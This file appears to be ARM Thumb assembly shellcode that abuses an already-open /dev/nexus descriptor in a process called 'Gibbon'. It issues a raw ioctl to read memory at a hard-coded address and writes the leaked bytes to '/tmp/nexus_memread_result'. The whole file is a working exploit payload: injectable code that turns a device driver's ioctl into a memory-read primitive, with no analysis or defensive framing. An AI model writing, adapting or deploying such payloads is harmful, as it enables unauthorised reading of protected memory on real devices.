.syntax unified
.thumb
.short 0                    @ discarded: gives _start link address 2 mod 4
.global _start
.thumb_func
_start:
    sub sp, #16

    movs r4, #5                @ initialized /dev/nexus fd in Gibbon

    ldr r0, target_address
    str r0, [sp, #0]
    add r1, sp, #12
    str r1, [sp, #4]
    mov r0, r4
    ldr r1, read_ioctl
    mov r2, sp
    movs r7, #54
    svc #0
    ldr r3, [sp, #12]
    str r3, [sp, #4]
    str r0, [sp, #8]

    adr r0, result_path
    ldr r1, open_flags
    movs r2, #192
    lsls r2, r2, #1          @ mode 0600
    movs r7, #5
    svc #0
    mov r5, r0

    mov r0, r5
    mov r1, sp
    movs r2, #12
    movs r7, #4
    svc #0

    movs r0, #0
    movs r7, #1
    svc #0

.align 2
target_address: .word 0xbf569640
read_ioctl:     .word 0x00650025
open_flags:     .word 0x00000241
device:         .asciz "/proc/2101/fd/5"
result_path:    .asciz "/tmp/nexus_memread_result"
